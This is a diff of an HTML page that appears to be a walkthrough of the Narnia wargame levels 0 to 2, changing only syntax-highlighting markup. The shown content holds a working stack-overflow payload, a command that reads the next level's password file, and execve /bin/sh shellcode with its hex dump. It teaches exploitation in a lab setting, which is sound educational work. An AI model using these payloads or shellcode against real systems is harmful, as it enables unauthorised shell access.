@@ -23,9 +23,9 @@
 &lt;h3&gt;Assembly and the  Stack Registers&lt;/h3&gt;
 &lt;p&gt;Registers are small memory storage areas built into the CPU. When the process enters the Stack,  a register called the &lt;strong&gt;Stack pointer&lt;/strong&gt; (esp) points to the top of the Stack (lowest memory address).  The bottom of the Stack (higher memory address) is at a fixed address (adjusted by the kernel at run time). The CPU will implement instructions to push onto and pop stuff of the Stack.&lt;/p&gt;
 &lt;p&gt;In Assembly code this looks like:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;pushl %ebp
-movl %esp,%ebp
-subl $20,%esp
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;pushl&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;ebp&lt;/span&gt;
+&lt;span class="n"&gt;movl&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;ebp&lt;/span&gt;
+&lt;span class="n"&gt;subl&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -62,7 +62,7 @@ AAAAAAAAAAAAAAAAAAAA
 &lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$EGG&lt;/span&gt;
 0X41414141
 &lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;export &lt;/span&gt;EGG
-&lt;span class="nv"&gt;$ &lt;/span&gt;env &lt;span class="p"&gt;|&lt;/span&gt; grep EGG
+&lt;span class="nv"&gt;$ &lt;/span&gt;env | grep EGG
 &lt;span class="nv"&gt;EGG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0X41414141
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -73,7 +73,7 @@ AAAAAAAAAAAAAAAAAAAA
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;readelf&lt;/code&gt;:  Displays information about ELF files (the binaries). For example, a detail that will be important soon is the fact that, in Narnia, the &lt;em&gt;Stack is executable&lt;/em&gt;. This means that we can place shellcode within it. To check whether the Stack is executable see if the following output has  the flag &lt;strong&gt;E&lt;/strong&gt;:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;narnia1@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;readelf -a narnia1 &lt;span class="p"&gt;|&lt;/span&gt; grep GNU_STACK
+&lt;div class="highlight"&gt;&lt;pre&gt;narnia1@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;readelf -a narnia1 | grep GNU_STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -93,15 +93,15 @@ AAAAAAAAAAAAAAAAAAAA
 &lt;li&gt;To start a gdb instance: &lt;code&gt;gdb -q &amp;lt;EXECUTABLE&amp;gt;&lt;/code&gt;.&lt;/li&gt;
 &lt;li&gt;To get the Assembly code we use the &lt;code&gt;disassemble&lt;/code&gt; command. Constants are prefixed with a $ and registers with a %:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;(gdb) set disassembly-flavor intel
-(gdb) disas main
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;disassembly&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;flavor&lt;/span&gt; &lt;span class="n"&gt;intel&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;disas&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;To set breakpoints to the address to inspect, based on the values from the output above:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;(gdb) b *main+&amp;lt;SOME NUMBER&amp;gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="o"&gt;+&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;SOME&lt;/span&gt; &lt;span class="n"&gt;NUMBER&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -131,8 +131,8 @@ disas main
 
 
 &lt;p&gt;Or you can have a nice &lt;strong&gt;.gdbinit&lt;/strong&gt; setup with lines such as:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;set disassembly-flavor intel
-set follow-fork-mode child
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;disassembly&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;flavor&lt;/span&gt; &lt;span class="n"&gt;intel&lt;/span&gt;
+&lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;follow&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;fork&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;mode&lt;/span&gt; &lt;span class="n"&gt;child&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -154,24 +154,24 @@ set follow-fork-mode child
 &lt;span class="c"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
 
 int main&lt;span class="o"&gt;(){&lt;/span&gt;
-  long &lt;span class="nv"&gt;val&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x41414141&lt;span class="p"&gt;;&lt;/span&gt;
-  char buf&lt;span class="o"&gt;[&lt;/span&gt;20&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  long &lt;span class="nv"&gt;val&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x41414141;
+  char buf&lt;span class="o"&gt;[&lt;/span&gt;20&lt;span class="o"&gt;]&lt;/span&gt;;
 
-  &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!\n&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-  &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Here is your chance: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-  scanf&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;%24s&amp;quot;&lt;/span&gt;,&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;buf&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!\n&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
+  &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Here is your chance: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
+  scanf&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;%24s&amp;quot;&lt;/span&gt;,&amp;amp;buf&lt;span class="o"&gt;)&lt;/span&gt;;
 
-  &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;buf: %s\n&amp;quot;&lt;/span&gt;,buf&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-  &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;val: 0x%08x\n&amp;quot;&lt;/span&gt;,val&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;buf: %s\n&amp;quot;&lt;/span&gt;,buf&lt;span class="o"&gt;)&lt;/span&gt;;
+  &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;val: 0x%08x\n&amp;quot;&lt;/span&gt;,val&lt;span class="o"&gt;)&lt;/span&gt;;
 
   &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;val&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;0xdeadbeef&lt;span class="o"&gt;)&lt;/span&gt;
-    system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
   &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
-    &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WAY OFF!!!!\n&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WAY OFF!!!!\n&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
+    &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt;;
   &lt;span class="o"&gt;}&lt;/span&gt;
 
-  &lt;span class="k"&gt;return&lt;/span&gt; 0&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="k"&gt;return &lt;/span&gt;0;
 &lt;span class="o"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -197,7 +197,7 @@ int main&lt;span class="o"&gt;(){&lt;/span&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;B&amp;quot;*24&amp;#39;&lt;/span&gt;
 BBBBBBBBBBBBBBBBBBBBBBBB
 
-narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;B&amp;quot;*19&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./narnia0
+narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;B&amp;quot;*19&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; | ./narnia0
 Correct val&lt;span class="s1"&gt;&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;
 &lt;span class="s1"&gt;Here is your chance: buf: BBBBBBBBBBBBBBBBBBB&lt;/span&gt;
 &lt;span class="s1"&gt;val: 0x41414141&lt;/span&gt;
@@ -210,7 +210,7 @@ Here is your chance: buf: BBBBBBBBBBBBBBBBBBBB
 val: 0x41414100
 WAY OFF!!!!
 
-narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;B&amp;quot;*21&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./narnia0
+narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;B&amp;quot;*21&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; | ./narnia0
 Correct val&lt;span class="s1"&gt;&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;
 &lt;span class="s1"&gt;Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBB&lt;/span&gt;
 &lt;span class="s1"&gt;val: 0x41410042&lt;/span&gt;
@@ -222,7 +222,7 @@ Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBB
 val: 0x41004242
 WAY OFF!!!!
 
-narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;B&amp;quot;*23&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./narnia0
+narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;B&amp;quot;*23&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; | ./narnia0
 Correct val&lt;span class="s1"&gt;&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;
 &lt;span class="s1"&gt;Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBBB&lt;/span&gt;
 &lt;span class="s1"&gt;val: 0x00424242&lt;/span&gt;
@@ -241,7 +241,7 @@ WAY OFF!!!!
 &lt;p&gt;However, we need to write this in hexadecimal form:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;python -c&lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*20 + &amp;quot;\xef\xbe\xad\xde&amp;quot;&amp;#39;&lt;/span&gt;
 AAAAAAAAAAAAAAAAAAAAﾭ
-narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c&lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*20 + &amp;quot;\xef\xbe\xad\xde&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; ./narnia0 Correct val&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
+narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c&lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*20 + &amp;quot;\xef\xbe\xad\xde&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; | ./narnia0 Correct val&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef
 &lt;/pre&gt;&lt;/div&gt;
@@ -252,7 +252,7 @@ val: 0xdeadbeef
 &lt;p&gt;We  were able to get access to our shell, but it closed too fast, when the program execution ended.&lt;/p&gt;
 &lt;p&gt;We need to create a way to read the password before we loose the  control to the shell. A good way is pipelining some command that  waits for an input, such as &lt;code&gt;tail&lt;/code&gt; or &lt;code&gt;cat&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;It turns out that only &lt;code&gt;cat&lt;/code&gt; actually prints the output:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c&lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*20 + &amp;quot;\xef\xbe\xad\xde&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; cat&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; /narnia/narnia0
+&lt;div class="highlight"&gt;&lt;pre&gt;narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c&lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*20 + &amp;quot;\xef\xbe\xad\xde&amp;quot;&amp;#39;&lt;/span&gt;; cat&lt;span class="o"&gt;)&lt;/span&gt; | /narnia/narnia0
 Correct val&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef
@@ -266,7 +266,7 @@ cat /etc/narnia_pass/narnia1
 &lt;div class="highlight"&gt;&lt;pre&gt;narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;gdb ./narnia0
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;set &lt;/span&gt;disassembly-flavor intel
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; disas main
-Dump of assembler code &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; main:
+Dump of assembler code &lt;span class="k"&gt;for function &lt;/span&gt;main:
    0x080484c4 &amp;lt;+0&amp;gt;: push   ebp
    0x080484c5 &amp;lt;+1&amp;gt;: mov    ebp,esp
    0x080484c7 &amp;lt;+3&amp;gt;: and    esp,0xfffffff0
@@ -292,7 +292,7 @@ End of assembler dump.
 
 &lt;p&gt;Let's put a break point right after &lt;code&gt;scanf&lt;/code&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; b *main+63
-Breakpoint &lt;span class="m"&gt;1&lt;/span&gt; at 0x8048503
+Breakpoint 1 at 0x8048503
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -327,10 +327,10 @@ Breakpoint 1, 0x08048503 in main &lt;span class="o"&gt;()&lt;/span&gt;
 &lt;h2&gt;Level 1:  Stack Overflow  with Environment Variables&lt;/h2&gt;
 &lt;h3&gt;Step 1: Understanding the Problem&lt;/h3&gt;
 &lt;p&gt;The second level starts with:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia1&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nl"&gt;melinda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia1&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia1&lt;/span&gt;
 &lt;span class="n"&gt;Give&lt;/span&gt; &lt;span class="n"&gt;me&lt;/span&gt; &lt;span class="n"&gt;something&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;execute&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;env&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;variable&lt;/span&gt; &lt;span class="n"&gt;EGG&lt;/span&gt;
 
-&lt;span class="n"&gt;narnia1&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nl"&gt;melinda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;narnia1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
+&lt;span class="n"&gt;narnia1&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;narnia1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
 &lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
 
 &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
@@ -366,17 +366,17 @@ Segmentation fault
 &lt;p&gt;Nope.&lt;/p&gt;
 &lt;p&gt;We actually need to create a hexadecimal command to export to &lt;strong&gt;EGG&lt;/strong&gt;. We do this in Assembly and all the information we need is in the &lt;a href="http://insecure.org/stf/smashStack.html"&gt;Appendix A&lt;/a&gt; from &lt;a href="http://en.wikipedia.org/wiki/Elias_Levy"&gt;Aleph One&lt;/a&gt;'s paper. This allows us to write the following:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;narnia1@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;vi shellspawn.asm
-xor eax, eax        &lt;span class="p"&gt;;&lt;/span&gt; make eax equal to 0
-push eax            &lt;span class="p"&gt;;&lt;/span&gt; pushes null
-push 0x68732f2f     &lt;span class="p"&gt;;&lt;/span&gt; pushes /sh &lt;span class="o"&gt;(&lt;/span&gt;//&lt;span class="o"&gt;)&lt;/span&gt;
-push 0x6e69622f     &lt;span class="p"&gt;;&lt;/span&gt; pushes /bin
-mov ebx, esp        &lt;span class="p"&gt;;&lt;/span&gt; passes the first argument
-push eax            &lt;span class="p"&gt;;&lt;/span&gt; empty third argument
-mov edx, esp        &lt;span class="p"&gt;;&lt;/span&gt; passes the third argument
-push eax            &lt;span class="p"&gt;;&lt;/span&gt; empty second argument
-mov ecx, esp        &lt;span class="p"&gt;;&lt;/span&gt; passes the second argument
-mov al, &lt;span class="m"&gt;11&lt;/span&gt;          &lt;span class="p"&gt;;&lt;/span&gt; execve system call &lt;span class="c"&gt;#11&lt;/span&gt;
-int 0x80            &lt;span class="p"&gt;;&lt;/span&gt; makes  an interrupt
+xor eax, eax        ; make eax equal to 0
+push eax            ; pushes null
+push 0x68732f2f     ; pushes /sh &lt;span class="o"&gt;(&lt;/span&gt;//&lt;span class="o"&gt;)&lt;/span&gt;
+push 0x6e69622f     ; pushes /bin
+mov ebx, esp        ; passes the first argument
+push eax            ; empty third argument
+mov edx, esp        ; passes the third argument
+push eax            ; empty second argument
+mov ecx, esp        ; passes the second argument
+mov al, 11          ; execve system call &lt;span class="c"&gt;#11&lt;/span&gt;
+int 0x80            ; makes  an interrupt
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -405,8 +405,8 @@ narnia2
 &lt;h3&gt;Step 4: Convert it to Hexadecimal&lt;/h3&gt;
 &lt;p&gt;It's really useful to have a hexadecimal form of our exploit (as we will see in the next levels) so we will use &lt;code&gt;xxd&lt;/code&gt; to read it:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;narnia5@melinda:/tmp&lt;span class="nv"&gt;$ &lt;/span&gt;xxd shellspawn
-0000000: 31c0 &lt;span class="m"&gt;5068&lt;/span&gt; 2f2f &lt;span class="m"&gt;7368&lt;/span&gt; 682f &lt;span class="m"&gt;6269&lt;/span&gt; 6e89 e350  1.Ph//shh/bin..P
-0000010: 89e2 &lt;span class="m"&gt;5089&lt;/span&gt; e1b0 0bcd &lt;span class="m"&gt;80&lt;/span&gt;                   ..P......
+0000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e350  1.Ph//shh/bin..P
+0000010: 89e2 5089 e1b0 0bcd 80                   ..P......
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -423,9 +423,9 @@ narnia2
 &lt;h2&gt;Level 2: Stack Overflow to the Return Address&lt;/h2&gt;
 &lt;h3&gt;Step 1: Understanding the Problem:&lt;/h3&gt;
 &lt;p&gt;The third level starts with:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nl"&gt;melinda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;
-&lt;span class="nl"&gt;Usage&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt; &lt;span class="n"&gt;argument&lt;/span&gt;
-&lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nl"&gt;melinda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt;
+&lt;span class="nl"&gt;Usage:&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia2&lt;/span&gt; &lt;span class="n"&gt;argument&lt;/span&gt;
+&lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;narnia2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
 &lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
 &lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
